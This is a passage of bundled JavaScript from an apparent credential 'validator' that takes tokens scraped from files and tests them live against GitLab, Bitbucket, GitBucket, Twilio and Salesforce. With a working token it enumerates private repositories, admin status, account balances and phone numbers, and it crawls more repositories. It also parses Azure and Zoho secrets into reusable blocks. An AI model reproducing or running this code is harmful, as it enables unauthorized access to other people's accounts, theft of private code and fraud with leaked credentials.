    if (res.status !== 200 || !res.text?.trim()) continue;
    if (res.text.trimStart().startsWith("{") && /"type"\s*:\s*"error"/.test(res.text)) continue;
    const matches = extractHarvestMatches(res.text);
    if (!matches.length) return null;
    return {
      fullName,
      filePath,
      content: res.text,
      htmlUrl: `https://bitbucket.org/${fullName}/src/${rev}/${filePath}`,
      matches,
      summary: harvestSummary(fullName, filePath, matches),
      forge: "bitbucket"
    };
  }
  return null;
}

// packages/validator/src/git-forges.ts
var PLACEHOLDER = /^(null|undefined|none|changeme|your-?token|your_token|xxxxx+|\*+|placeholder)$/i;
function json2(text) {
  try {
    return JSON.parse(text);
  } catch {
    return {};
  }
}
function blob(hit, match, siblings) {
  return [hit.contentSnippet ?? "", match.context, ...siblings.map((s) => s.context)].join("\n");
}
function envVal(text, names) {
  for (const name of names) {
    const re = new RegExp(`\\b${name}\\s*[=:]\\s*["']?([^\\s#;"']+)`, "i");
    const m = text.match(re);
    const v = m?.[1]?.trim() ?? "";
    if (v && !PLACEHOLDER.test(v)) return v.replace(/\/+$/, "");
  }
  return "";
}
function forgeHost(raw) {
  const v = raw.trim();
  if (!v) return "";
  try {
    const u = new URL(v.includes("://") ? v : `https://${v}`);
    if (!u.hostname || u.hostname === "localhost") return "";
    return `${u.protocol}//${u.host}`;
  } catch {
    return "";
  }
}
function usableToken(value) {
  const v = value.trim();
  if (v.length < 16) return false;
  if (PLACEHOLDER.test(v)) return false;
  return true;
}
function identity(login, name, email) {
  if (!login) return "?";
  let out = name?.trim() ? `${login} (${name.trim()})` : login;
  if (email?.trim()) out += ` | ${email.trim()}`;
  return out;
}
var GitLabHandler = class {
  constructor(http) {
    this.http = http;
  }
  http;
  service = "gitlab";
  async validate(hit, match, siblings) {
    const token = match.value.trim();
    if (!usableToken(token)) {
      return { service: "gitlab", valid: false, raw: true, details: "token placeholder \u2014 skip", meta: { skipNotify: "1" } };
    }
    const text = blob(hit, match, siblings);
    const custom = forgeHost(envVal(text, ["GITLAB_URL", "GITLAB_HOST", "CI_SERVER_URL", "GITLAB_HOST_URL"]));
    const origin = hit.origin?.replace(/\/+$/, "") ?? "";
    const originLooksGitlab = /gitlab/i.test(hit.path ?? "") || /gitlab/i.test(hit.url ?? "") || /gitlab/i.test(origin);
    const bases = [...new Set([custom, originLooksGitlab ? origin : "", "https://gitlab.com"].filter(Boolean))];
    let last = "request failed";
    for (const base of bases) {
      const tried = await this.probe(base, token, hit);
      if (tried) return tried;
      last = `HTTP on ${base}`;
    }
    return { service: "gitlab", valid: false, details: last };
  }
  async probe(base, token, hit) {
    const headersList = [{ "private-token": token }, { authorization: `Bearer ${token}` }];
    for (const headers of headersList) {
      try {
        const res = await this.http.get(`${base}/api/v4/user`, { budget: "httpRequest", headers });
        if (res.status === 404 || res.status === 0) return null;
        if (res.status !== 200) continue;
        const user = json2(res.text);
        const login = user.username ?? "?";
        let publicRepos = "0";
        let privateRepos = "0";
        let recent = "";
        try {
          const proj = await this.http.get(`${base}/api/v4/projects?membership=true&simple=true&per_page=10&order_by=last_activity_at`, {
            budget: "httpRequest",
            headers
          });
          if (proj.status === 200) {
            const list = json2(proj.text);
            if (Array.isArray(list)) {
              const listedPub = list.filter((p) => p.visibility === "public").length;
              const listedPriv = list.filter((p) => p.visibility !== "public").length;
              const total = Number(resHeader(proj.headers, "x-total") || list.length);
              publicRepos = String(listedPub);
              privateRepos = String(Math.max(listedPriv, Math.max(0, total - listedPub)));
              recent = list.slice(0, 8).map((p) => p.path_with_namespace).filter(Boolean).join(", ");
            }
          }
        } catch {
        }
        const harvested = /^(gh|gl|bb)-harvest:/.test(hit.path ?? "") ? [] : await harvestGitLabRepos(this.http, headers, base);
        return {
          service: "gitlab",
          valid: true,
          details: `user ${login} @ ${base}`,
          meta: {
            identity: identity(login, user.name, user.email),
            publicRepos,
            privateRepos,
            host: base.replace(/^https?:\/\//, ""),
            admin: user.is_admin ? "oui" : "non",
            ...recent ? { recentRepos: recent } : {},
            ...harvested.length ? { crawled: String(harvested.length) } : {}
          },
          harvested
        };
      } catch {
      }
    }
    return null;
  }
};
function resHeader(headers, name) {
  return headers[name] ?? headers[name.toLowerCase()] ?? "";
}
var BitbucketHandler = class {
  constructor(http) {
    this.http = http;
  }
  http;
  service = "bitbucket";
  async validate(hit, match, siblings) {
    const token = match.value.trim();
    if (!usableToken(token)) {
      return { service: "bitbucket", valid: false, raw: true, details: "token placeholder \u2014 skip", meta: { skipNotify: "1" } };
    }
    const text = blob(hit, match, siblings);
    const userName = envVal(text, ["BITBUCKET_USERNAME", "BITBUCKET_USER", "BB_USERNAME", "BITBUCKET_EMAIL"]);
    const auths = [{ authorization: `Bearer ${token}` }];
    if (userName) {
      auths.push({ authorization: `Basic ${Buffer.from(`${userName}:${token}`).toString("base64")}` });
    }
    let last = "request failed";
    for (const headers of auths) {
      try {
        const res = await this.http.get("https://api.bitbucket.org/2.0/user", { budget: "httpRequest", headers });
        if (res.status === 401 || res.status === 403) {
          last = `HTTP ${res.status}`;
          continue;
        }
        if (res.status !== 200) return { service: "bitbucket", valid: false, details: `HTTP ${res.status}` };
        const user = json2(res.text);
        const login = user.username || user.display_name || "?";
        let publicRepos = "0";
        let privateRepos = "0";
        let recent = "";
        try {
          const repos = await this.http.get("https://api.bitbucket.org/2.0/repositories?role=member&pagelen=10", {
            budget: "httpRequest",
            headers
          });
          if (repos.status === 200) {
            const body = json2(repos.text);
            const list = body.values ?? [];
            publicRepos = String(list.filter((r) => !r.is_private).length);
            privateRepos = String(list.filter((r) => r.is_private).length);
            if (typeof body.size === "number" && body.size > list.length) {
              privateRepos = String(Math.max(Number(privateRepos), body.size - Number(publicRepos)));
            }
            recent = list.slice(0, 8).map((r) => `${r.full_name ?? r.slug ?? "?"}${r.is_private ? " \u{1F512}" : ""}`).join(", ");
          }
        } catch {
        }
        const harvested = /^(gh|gl|bb)-harvest:/.test(hit.path ?? "") ? [] : await harvestBitbucketRepos(this.http, headers);
        return {
          service: "bitbucket",
          valid: true,
          details: `user ${login}`,
          meta: {
            identity: identity(login, user.display_name),
            publicRepos,
            privateRepos,
            ...recent ? { recentRepos: recent } : {},
            ...harvested.length ? { crawled: String(harvested.length) } : {}
          },
          harvested
        };
      } catch (err) {
        last = err.message;
      }
    }
    return { service: "bitbucket", valid: false, details: last };
  }
};
var GitBucketHandler = class {
  constructor(http) {
    this.http = http;
  }
  http;
  service = "gitbucket";
  async validate(hit, match, siblings) {
    const token = match.value.trim();
    if (!usableToken(token)) {
      return { service: "gitbucket", valid: false, raw: true, details: "token placeholder \u2014 skip", meta: { skipNotify: "1" } };
    }
    const text = blob(hit, match, siblings);
    const custom = forgeHost(envVal(text, ["GITBUCKET_URL", "GITBUCKET_HOST", "GITBUCKET_HOST_URL"]));
    const origin = hit.origin?.replace(/\/+$/, "") ?? "";
    const bases = [...new Set([custom, origin].filter(Boolean))];
    if (!bases.length) {
      return { service: "gitbucket", valid: false, raw: true, details: "pas de host GitBucket \u2014 skip", meta: { skipNotify: "1" } };
    }
    for (const base of bases) {
      for (const headers of [{ authorization: `token ${token}` }, { authorization: `Bearer ${token}` }]) {
        try {
          const res = await this.http.get(`${base}/api/v3/user`, { budget: "httpRequest", headers });
          if (res.status === 404) break;
          if (res.status !== 200) continue;
          const user = json2(res.text);
          const login = user.login ?? "?";
          if (login === "?" && !user.name) continue;
          return {
            service: "gitbucket",
            valid: true,
            details: `user ${login} @ ${base}`,
            meta: {
              identity: identity(login, user.name, user.email),
              publicRepos: String(user.public_repos ?? 0),
              privateRepos: String(user.total_private_repos ?? 0),
              followers: String(user.followers ?? 0),
              host: base.replace(/^https?:\/\//, "")
            }
          };
        } catch {
        }
      }
    }
    return { service: "gitbucket", valid: false, raw: true, details: "GitBucket injoignable \u2014 skip", meta: { skipNotify: "1" } };
  }
};

// packages/validator/src/twilio.ts
var SID_RE = /\b(AC[0-9a-fA-F]{32})\b/;
var SK_RE = /\b(SK[0-9a-fA-F]{32})\b/;
var TOKEN_RE = /\b([0-9a-fA-F]{32})\b/;
function collectTwilioCreds(hit, match, siblings) {
  const blob2 = [hit.contentSnippet ?? "", match.context, ...siblings.map((s) => s.context), ...[match, ...siblings].map((s) => s.value)].join(
    "\n"
  );
  let sid = [match, ...siblings].find((s) => SID_RE.test(s.value))?.value.match(SID_RE)?.[1] ?? "";
  let apiKey = [match, ...siblings].find((s) => SK_RE.test(s.value))?.value.match(SK_RE)?.[1] ?? "";
  const used = new Set([sid.slice(2).toLowerCase(), apiKey.slice(2).toLowerCase()].filter(Boolean));
  let token = "";
  for (const s of [match, ...siblings]) {
    const m = s.value.match(TOKEN_RE);
    if (!m) continue;
    const hex = m[1];
    if (used.has(hex.toLowerCase())) continue;
    if (SID_RE.test(s.value) || SK_RE.test(s.value)) continue;
    token = hex;
    break;
  }
  if (!sid) sid = blob2.match(SID_RE)?.[1] ?? "";
  if (!apiKey) apiKey = blob2.match(SK_RE)?.[1] ?? "";
  if (!token) {
    for (const m of blob2.matchAll(new RegExp(TOKEN_RE.source, "g"))) {
      const hex = m[1];
      if (used.has(hex.toLowerCase())) continue;
      if (hex === sid.slice(2) || hex === apiKey.slice(2)) continue;
      token = hex;
      break;
    }
  }
  let encoded = "";
  const b64 = blob2.match(/\b([A-Za-z0-9+/]{40,}={0,2})\b/);
  if (b64) {
    try {
      const decoded = Buffer.from(b64[1], "base64").toString("utf8");
      const parts = decoded.split(":");
      if (parts.length >= 2 && SID_RE.test(parts[0]) && TOKEN_RE.test(parts[1])) {
        encoded = b64[1];
        sid = sid || parts[0].match(SID_RE)[1];
        token = token || parts[1].match(TOKEN_RE)[1];
      }
    } catch {
    }
  }
  return { sid, token, apiKey, encoded };
}
function json3(text) {
  try {
    return JSON.parse(text);
  } catch {
    return {};
  }
}
function basic(user, pass) {
  return { authorization: `Basic ${Buffer.from(`${user}:${pass}`).toString("base64")}` };
}
var TwilioHandler = class {
  constructor(http) {
    this.http = http;
  }
  http;
  service = "twilio";
  async validate(hit, match, siblings) {
    const creds = collectTwilioCreds(hit, match, siblings);
    if (!creds.sid || !creds.token) {
      return { service: "twilio", valid: false, raw: true, details: "pas une paire Twilio", meta: { skipNotify: "1" } };
    }
    const user = creds.apiKey || creds.sid;
    const headers = basic(user, creds.token);
    try {
      const acct = await this.http.get(`https://api.twilio.com/2010-04-01/Accounts/${creds.sid}.json`, {
        budget: "httpRequest",
        headers
      });
      if (acct.status === 401 || acct.status === 403) {
        return {
          service: "twilio",
          valid: false,
          details: `HTTP ${acct.status}`,
          error: acct.text.slice(0, 120),
          meta: { accountSid: creds.sid, authToken: creds.token }
        };
      }
      if (acct.status !== 200) {
        return {
          service: "twilio",
          valid: false,
          raw: true,
          details: `HTTP ${acct.status}`,
          meta: { accountSid: creds.sid, authToken: creds.token }
        };
      }
      const a = json3(acct.text);
      const extra = await this.balanceAndNumbers(creds.sid, headers);
      return {
        service: "twilio",
        valid: true,
        details: `Nom: ${a.friendly_name ?? "N/A"} | Solde: ${extra.balance} | Num\xE9ros: ${extra.numbers}`,
        meta: {
          accountSid: creds.sid,
          authToken: creds.token,
          encoded: creds.encoded,
          friendlyName: a.friendly_name ?? "N/A",
          accountStatus: a.status ?? "N/A",
          accountType: a.type ?? "N/A",
          balance: extra.balance,
          numbers: extra.numbers
        }
      };
    } catch (err) {
      return {
        service: "twilio",
        valid: false,
        details: "request failed",
        error: err.message,
        meta: { statusKind: "unverified-network", accountSid: creds.sid, authToken: creds.token }
      };
    }
  }
  async balanceAndNumbers(sid, headers) {
    let balance = "N/A";
    let numbers = "Aucun";
    try {
      const bal = await this.http.get(`https://api.twilio.com/2010-04-01/Accounts/${sid}/Balance.json`, {
        budget: "httpRequest",
        headers
      });
      if (bal.status === 200) {
        const b2 = json3(bal.text);
        balance = `${b2.balance ?? "0"} ${b2.currency ?? "USD"}`;
      }
    } catch {
    }
    try {
      const num = await this.http.get(`https://api.twilio.com/2010-04-01/Accounts/${sid}/IncomingPhoneNumbers.json`, {
        budget: "httpRequest",
        headers
      });
      if (num.status === 200) {
        const n = json3(num.text);
        const list = (n.incoming_phone_numbers ?? []).map((x) => x.phone_number).filter(Boolean);
        if (list.length) numbers = list.slice(0, 5).join(", ");
      }
    } catch {
    }
    return { balance, numbers };
  }
};

// packages/validator/src/salesforce-env.ts
var ALIASES2 = {
  SALESFORCE_USERNAME: "SF_USERNAME",
  SFDC_USERNAME: "SF_USERNAME",
  SF_USER: "SF_USERNAME",
  SALESFORCE_USER: "SF_USERNAME",
  SALESFORCE_PASSWORD: "SF_PASSWORD",
  SFDC_PASSWORD: "SF_PASSWORD",
  SALESFORCE_SECURITY_TOKEN: "SF_SECURITY_TOKEN",
  SFDC_SECURITY_TOKEN: "SF_SECURITY_TOKEN",
  SF_TOKEN: "SF_SECURITY_TOKEN",
  SALESFORCE_ACCESS_TOKEN: "SF_ACCESS_TOKEN",
  SF_SESSION_ID: "SF_SESSION_ID",
  SALESFORCE_SESSION_ID: "SF_SESSION_ID",
  SALESFORCE_CLIENT_ID: "SF_CLIENT_ID",
  SF_CONSUMER_KEY: "SF_CLIENT_ID",
  SALESFORCE_CONSUMER_KEY: "SF_CLIENT_ID",
  SALESFORCE_CLIENT_SECRET: "SF_CLIENT_SECRET",
  SALESFORCE_CONSUMER_SECRET: "SF_CLIENT_SECRET",
  SF_CONSUMER_SECRET: "SF_CLIENT_SECRET",
  SALESFORCE_INSTANCE_URL: "SF_INSTANCE_URL",
  SF_URL: "SF_INSTANCE_URL",
  SALESFORCE_LOGIN_URL: "SF_LOGIN_URL",
  SF_LOGIN_URL: "SF_LOGIN_URL"
};
var KEY_RE = /\b(SALESFORCE_[A-Z0-9_]+|SFDC_[A-Z0-9_]+|SF_[A-Z0-9_]+)\s*=[ \t]*/gi;
var SESSION_RE = /\b(00D[A-Za-z0-9]{12,15}![A-Za-z0-9._]{50,})\b/g;
var INSTANCE_RE = /https:\/\/[a-z0-9.-]+\.(?:my\.)?salesforce\.com(?:\/[^\s"'<>]*)?/i;
function canonicalSfKey(raw) {
  const key = raw.toUpperCase();
  return ALIASES2[key] ?? key;
}
function parseSalesforceAssignments(text) {
  const env = {};
  KEY_RE.lastIndex = 0;
  let m;
  while (m = KEY_RE.exec(text)) {
    const canon = canonicalSfKey(m[1]);
    const start = m.index + m[0].length;
    const rest = text.slice(start);
    const quote = rest[0];
    let value = "";
    if (quote === '"' || quote === "'") {
      const end = rest.indexOf(quote, 1);
      value = (end >= 0 ? rest.slice(1, end) : rest.slice(1).split(/\s/, 1)[0] ?? "").trim();
    } else {
      value = (rest.match(/^[^\s#;]+/)?.[0] ?? "").trim();
    }
    if (value) env[canon] = value;
  }
  SESSION_RE.lastIndex = 0;
  const sid = SESSION_RE.exec(text);
  if (sid && !env.SF_SESSION_ID) env.SF_SESSION_ID = sid[1];
  const inst = text.match(INSTANCE_RE);
  if (inst && !env.SF_INSTANCE_URL) env.SF_INSTANCE_URL = inst[0].replace(/\/+$/, "");
  return env;
}
function collectSalesforceEnv(hit, match, siblings) {
  const blob2 = [hit.contentSnippet ?? "", match.context, match.value, ...siblings.map((s) => `${s.context}
${s.value}`)].join(
    "\n"
  );
  const env = parseSalesforceAssignments(blob2);
  for (const s of [match, ...siblings]) {
    if (s.service !== "salesforce") continue;
    const v = s.value.trim();
    if (!v) continue;
    if (/^00D[A-Za-z0-9]{12,15}!/.test(v) && !env.SF_SESSION_ID) env.SF_SESSION_ID = v;
    else if (/^https:\/\//i.test(v) && !env.SF_INSTANCE_URL) env.SF_INSTANCE_URL = v;
  }
  return env;
}
function formatSalesforceBlock(env) {
  const keys = [
    "SF_USERNAME",
    "SF_PASSWORD",
    "SF_SECURITY_TOKEN",
    "SF_SESSION_ID",
    "SF_ACCESS_TOKEN",
    "SF_CLIENT_ID",
    "SF_CLIENT_SECRET",
    "SF_INSTANCE_URL",
    "SF_LOGIN_URL"
  ];
  return keys.filter((k) => env[k]).map((k) => `${k}=${env[k]}`).join("\n");
}
function isUsableSalesforce(env) {
  if (env.SF_SESSION_ID && env.SF_SESSION_ID.length > 40) return true;
  if (env.SF_ACCESS_TOKEN && env.SF_ACCESS_TOKEN.length > 20) return true;
  if (env.SF_USERNAME && env.SF_PASSWORD) return true;
  if (env.SF_CLIENT_ID && env.SF_CLIENT_SECRET && env.SF_CLIENT_SECRET.length >= 8) return true;
  return false;
}
function salesforceFingerprint(env) {
  if (env.SF_SESSION_ID) return `sf:sid:${env.SF_SESSION_ID}`;
  if (env.SF_ACCESS_TOKEN) return `sf:at:${env.SF_ACCESS_TOKEN}`;
  if (env.SF_USERNAME && env.SF_PASSWORD) {
    return `sf:up:${env.SF_USERNAME}:${env.SF_PASSWORD}:${env.SF_SECURITY_TOKEN ?? ""}`;
  }
  if (env.SF_CLIENT_ID && env.SF_CLIENT_SECRET) return `sf:oauth:${env.SF_CLIENT_ID}:${env.SF_CLIENT_SECRET}`;
  return "";
}

// packages/validator/src/azure-env.ts
var GUID = /[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/i;
var ALIASES3 = {
  AZURE_TENANT: "AZURE_TENANT_ID",
  AZURE_TENANTID: "AZURE_TENANT_ID",
  TENANT_ID: "AZURE_TENANT_ID",
  AZURE_CLIENT: "AZURE_CLIENT_ID",
  AZURE_CLIENTID: "AZURE_CLIENT_ID",
  AZURE_APP_ID: "AZURE_CLIENT_ID",
  APPLICATION_ID: "AZURE_CLIENT_ID",
  AZURE_SECRET: "AZURE_CLIENT_SECRET",
  AZURE_CLIENTSECRET: "AZURE_CLIENT_SECRET",
  CLIENT_SECRET: "AZURE_CLIENT_SECRET",
  AZURE_STORAGE_KEY: "AZURE_ACCOUNT_KEY",
  AZURE_STORAGE_ACCOUNT_KEY: "AZURE_ACCOUNT_KEY",
  ACCOUNTKEY: "AZURE_ACCOUNT_KEY",
  AZURE_STORAGE_ACCOUNT: "AZURE_STORAGE_ACCOUNT",
  ACCOUNTNAME: "AZURE_STORAGE_ACCOUNT",
  AZURE_ACCOUNT_NAME: "AZURE_STORAGE_ACCOUNT"
};
var KEY_RE2 = /\b(AZURE_[A-Z0-9_]+|TENANT_ID|CLIENT_SECRET|APPLICATION_ID|ACCOUNTNAME|ACCOUNTKEY|AZURE_STORAGE_ACCOUNT|AZURE_STORAGE_KEY)\s*[=:][ \t]*/gi;
function parseAzureAssignments(text) {
  const env = {};
  KEY_RE2.lastIndex = 0;
  let m;
  while (m = KEY_RE2.exec(text)) {
    const canon = ALIASES3[m[1].toUpperCase()] ?? m[1].toUpperCase();
    const start = m.index + m[0].length;
    const rest = text.slice(start);
    const quote = rest[0];
    let value = "";
    if (quote === '"' || quote === "'") {
      const end = rest.indexOf(quote, 1);
      value = (end >= 0 ? rest.slice(1, end) : rest.slice(1).split(/\s/, 1)[0] ?? "").trim();
    } else {
      value = (rest.match(/^[^\s#;]+/)?.[0] ?? "").trim();
    }
    if (value) env[canon] = value;
  }
  const conn = text.match(/AccountName=([^;]+);AccountKey=([A-Za-z0-9+/=]{40,})/i);
  if (conn) {
    if (!env.AZURE_STORAGE_ACCOUNT) env.AZURE_STORAGE_ACCOUNT = conn[1];
    if (!env.AZURE_ACCOUNT_KEY) env.AZURE_ACCOUNT_KEY = conn[2];
  }
  const shared = text.match(/SharedAccessKey=([A-Za-z0-9+/=]{40,})/);
  if (shared && !env.AZURE_ACCOUNT_KEY) env.AZURE_ACCOUNT_KEY = shared[1];
  return env;
}
function collectAzureEnv(hit, match, siblings) {
  const blob2 = [hit.contentSnippet ?? "", match.context, match.value, ...siblings.map((s) => `${s.context}
${s.value}`)].join(
    "\n"
  );
  const env = parseAzureAssignments(blob2);
  for (const s of [match, ...siblings]) {
    if (s.service !== "azure") continue;
    const v = s.value.trim();
    if (GUID.test(v) && /tenant/i.test(s.patternName + s.context) && !env.AZURE_TENANT_ID) env.AZURE_TENANT_ID = v;
    else if (GUID.test(v) && /client|app/i.test(s.patternName + s.context) && !env.AZURE_CLIENT_ID) env.AZURE_CLIENT_ID = v;
    else if (v.length >= 34 && !GUID.test(v) && !env.AZURE_CLIENT_SECRET) env.AZURE_CLIENT_SECRET = v;
  }
  if (!env.AZURE_TENANT_ID) {
    const t = blob2.match(/(?:AZURE_TENANT_ID|TENANT_ID)\s*[=:]\s*['"]?([0-9a-f-]{36})/i);
    if (t) env.AZURE_TENANT_ID = t[1];
  }
  if (!env.AZURE_CLIENT_ID) {
    const c = blob2.match(/(?:AZURE_CLIENT_ID|AZURE_APP_ID|APPLICATION_ID)\s*[=:]\s*['"]?([0-9a-f-]{36})/i);
    if (c) env.AZURE_CLIENT_ID = c[1];
  }
  return env;
}
function formatAzureBlock(env) {
  const keys = [
    "AZURE_TENANT_ID",
    "AZURE_CLIENT_ID",
    "AZURE_CLIENT_SECRET",
    "AZURE_STORAGE_ACCOUNT",
    "AZURE_ACCOUNT_KEY"
  ];
  return keys.filter((k) => env[k]).map((k) => `${k}=${env[k]}`).join("\n");
}
function isUsableAzure(env) {
  return !!(env.AZURE_TENANT_ID && env.AZURE_CLIENT_ID && env.AZURE_CLIENT_SECRET && env.AZURE_CLIENT_SECRET.length >= 8);
}
function azureFingerprint(env) {
  if (env.AZURE_TENANT_ID && env.AZURE_CLIENT_ID && env.AZURE_CLIENT_SECRET) {
    return `azure:${env.AZURE_TENANT_ID}:${env.AZURE_CLIENT_ID}:${env.AZURE_CLIENT_SECRET}`;
  }
  if (env.AZURE_STORAGE_ACCOUNT && env.AZURE_ACCOUNT_KEY) {
    return `azure:stor:${env.AZURE_STORAGE_ACCOUNT}:${env.AZURE_ACCOUNT_KEY}`;
  }
  return "";
}

// packages/validator/src/zoho-env.ts
var REFRESH_RE = /\b(1000\.[a-zA-Z0-9]{20,40}\.[a-zA-Z0-9]{20,40})\b/;
var CLIENT_RE = /\b(1000\.[A-Za-z0-9]{20,40})(?!\.[A-Za-z0-9])/;
var ALIASES4 = {
  ZOHO_CRM_CLIENT_ID: "ZOHO_CLIENT_ID",
  ZOHO_CRM_CLIENT_SECRET: "ZOHO_CLIENT_SECRET",
  ZOHO_SECRET: "ZOHO_CLIENT_SECRET",
  ZOHO_AUTH_TOKEN: "ZOHO_REFRESH_TOKEN",
  ZOHO_CRM_REFRESH_TOKEN: "ZOHO_REFRESH_TOKEN",
  ZOHO_DC: "ZOHO_DC",
  ZOHO_REGION: "ZOHO_DC",
  ZOHO_ACCOUNTS_URL: "ZOHO_ACCOUNTS_URL"
};
var KEY_RE3 = /\b(ZOHO_[A-Z0-9_]+)\s*[=:][ \t]*/gi;
function parseZohoAssignments(text) {
  const env = {};
  KEY_RE3.lastIndex = 0;
  let m;
  while (m = KEY_RE3.exec(text)) {
    const canon = ALIASES4[m[1].toUpperCase()] ?? m[1].toUpperCase();
    const start = m.index + m[0].length;
    const rest = text.slice(start);
    const quote = rest[0];
    let value = "";
    if (quote === '"' || quote === "'") {
      const end = rest.indexOf(quote, 1);
      value = (end >= 0 ? rest.slice(1, end) : rest.slice(1).split(/\s/, 1)[0] ?? "").trim();
    } else {
      value = (rest.match(/^[^\s#;]+/)?.[0] ?? "").trim();
    }
    if (value) env[canon] = value;
  }
  const refresh = text.match(REFRESH_RE);
  if (refresh && !env.ZOHO_REFRESH_TOKEN) env.ZOHO_REFRESH_TOKEN = refresh[1];
  if (!env.ZOHO_CLIENT_ID) {
    const c = text.match(CLIENT_RE);
    if (c?.[1]) env.ZOHO_CLIENT_ID = c[1];
  }
  const dc = text.match(/accounts\.zoho\.([a-z.]+)/i) ?? text.match(/zohoapis\.([a-z.]+)/i);
  if (dc && !env.ZOHO_DC) env.ZOHO_DC = dc[1].replace(/\/$/, "");
  return env;
}
function collectZohoEnv(hit, match, siblings) {
  const blob2 = [hit.contentSnippet ?? "", match.context, match.value, ...siblings.map((s) => `${s.context}
${s.value}`)].join(
    "\n"
  );
  const env = parseZohoAssignments(blob2);
  for (const s of [match, ...siblings]) {
    if (s.service !== "zoho") continue;
    const v = s.value.trim();
    if (REFRESH_RE.test(v) && !env.ZOHO_REFRESH_TOKEN) env.ZOHO_REFRESH_TOKEN = v.match(REFRESH_RE)[1];
    else if (CLIENT_RE.test(v) && v.split(".").length === 2 && !env.ZOHO_CLIENT_ID) env.ZOHO_CLIENT_ID = v;
    else if (v.length >= 32 && !v.startsWith("1000.") && !env.ZOHO_CLIENT_SECRET) env.ZOHO_CLIENT_SECRET = v;
  }
  return env;
}
function formatZohoBlock(env) {
  const keys = ["ZOHO_CLIENT_ID", "ZOHO_CLIENT_SECRET", "ZOHO_REFRESH_TOKEN", "ZOHO_ACCESS_TOKEN", "ZOHO_DC"];
  return keys.filter((k) => env[k]).map((k) => `${k}=${env[k]}`).join("\n");
}
function isUsableZoho(env) {
  return !!(env.ZOHO_CLIENT_ID && env.ZOHO_CLIENT_SECRET && env.ZOHO_REFRESH_TOKEN);
}
function zohoFingerprint(env) {
  if (env.ZOHO_REFRESH_TOKEN) return `zoho:${env.ZOHO_REFRESH_TOKEN}`;
  if (env.ZOHO_ACCESS_TOKEN) return `zoho:at:${env.ZOHO_ACCESS_TOKEN}`;
  return "";
}
function zohoDcHosts(env) {
  const ordered = ["com", "eu", "in", "com.au", "jp"];
  const preferred = (env.ZOHO_DC ?? "").replace(/^zoho\.?/i, "").replace(/^\./, "") || domainFromUrl(env.ZOHO_ACCOUNTS_URL);
  const dcs = preferred ? [preferred, ...ordered.filter((d) => d !== preferred)] : ordered;
  return dcs.map((dc) => ({
    dc,
    accounts: `https://accounts.zoho.${dc}`,
    api: `https://www.zohoapis.${dc}`
  }));
}
function domainFromUrl(url) {
  if (!url) return "";
  const m = url.match(/zoho\.([a-z.]+)/i);
  return m?.[1] ?? "";
}

// packages/validator/src/crm-handlers.ts
function json4(text) {
  try {
    return JSON.parse(text);
  } catch {
    return {};
  }
}
function xmlEsc(s) {
  return s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;");
}
function xmlTag(xml, tag) {
  const m = xml.match(new RegExp(`<(?:[\\w]+:)?${tag}>([^<]*)</(?:[\\w]+:)?${tag}>`, "i"));
  return (m?.[1] ?? "").trim();
}
function form(data) {
  return Object.entries(data).map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(v)}`).join("&");
}
function skip(service, details) {
  return { service, valid: false, raw: true, details, meta: { skipNotify: "1" } };
}
function netSkip(service, err) {
  return skip(service, err.message || "r\xE9seau");
}
var SalesforceHandler = class {
  constructor(http) {
    this.http = http;
  }
  http;
  service = "salesforce";
  async validate(hit, match, siblings) {
    const env = collectSalesforceEnv(hit, match, siblings);
    const block = formatSalesforceBlock(env);
    if (!isUsableSalesforce(env)) return skip(this.service, "salesforce incomplet \u2014 skip");
    try {
      const token = env.SF_SESSION_ID || env.SF_ACCESS_TOKEN || "";
      if (token) {
        const info = await this.userinfo(token, env.SF_INSTANCE_URL);
        if (info) return this.ok(block, info, env);
        return {
          service: this.service,
          valid: false,
          details: "session rejet\xE9e",
          meta: { envBlock: block }
        };
      }
      if (env.SF_USERNAME && env.SF_PASSWORD) {
        const login = await this.soapLogin(env);
        if (login.ok) return this.ok(block, login.info, env);
        if (login.invalid && !(env.SF_CLIENT_ID && env.SF_CLIENT_SECRET)) {
          return { service: this.service, valid: false, details: login.details, meta: { envBlock: block } };
        }
      }
      if (env.SF_CLIENT_ID && env.SF_CLIENT_SECRET) {
        const oauth = await this.oauthClient(env);
        if (oauth.ok) return this.ok(block, oauth.info, env);
        if (oauth.invalid) {
          return { service: this.service, valid: false, details: oauth.details, meta: { envBlock: block } };
        }
        return skip(this.service, oauth.details);
      }
      return skip(this.service, "salesforce incomplet \u2014 skip");
    } catch (err) {
      return netSkip(this.service, err);
    }
  }
  ok(block, info, env) {
    const instance = info.instance || env.SF_INSTANCE_URL || "";
    return {
      service: this.service,
      valid: true,
      details: `org ${info.org || "N/A"}`,
      meta: {
        envBlock: block,
        org: info.org || "N/A",
        user: info.user || env.SF_USERNAME || "N/A",
        email: info.email || "N/A",
        instance: instance || "N/A",
        orgId: info.orgId || "",
        edition: info.edition || "",
        sandbox: info.sandbox || ""
      }
    };
  }
  async userinfo(token, instance) {
    const bases = [
      instance?.replace(/\/+$/, ""),
      "https://login.salesforce.com",
      "https://test.salesforce.com"
    ].filter((u) => !!u);
    for (const base of [...new Set(bases)]) {
      try {
        const res = await this.http.get(`${base}/services/oauth2/userinfo`, {
          budget: "httpRequest",
          headers: { authorization: `Bearer ${token}`, accept: "application/json" }
        });
        if (res.status === 401 || res.status === 403) continue;
        if (res.status !== 200) continue;
        const body = json4(res.text);
        return {
          user: body.name || body.preferred_username || body.nickname || "",
          email: body.email || "",
          orgId: body.organization_id || "",
          instance: body.urls?.custom_domain || base
        };
      } catch {
      }
    }
    return null;
  }
  async soapLogin(env) {
    const user = env.SF_USERNAME ?? "";
    const pass = `${env.SF_PASSWORD ?? ""}${env.SF_SECURITY_TOKEN ?? ""}`;
    const hosts = [
      env.SF_LOGIN_URL?.replace(/\/+$/, ""),
      /test|sandbox/i.test(env.SF_LOGIN_URL ?? env.SF_INSTANCE_URL ?? user ?? "") ? "https://test.salesforce.com" : "https://login.salesforce.com",
      "https://test.salesforce.com",
      "https://login.salesforce.com"
    ].filter((u, i, a) => !!u && a.indexOf(u) === i);
    const body = `<?xml version="1.0" encoding="utf-8"?>
<env:Envelope xmlns:env="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:partner.soap.sforce.com">
  <env:Body>
    <urn:login>
      <urn:username>${xmlEsc(user)}</urn:username>
      <urn:password>${xmlEsc(pass)}</urn:password>
    </urn:login>
  </env:Body>
</env:Envelope>`;
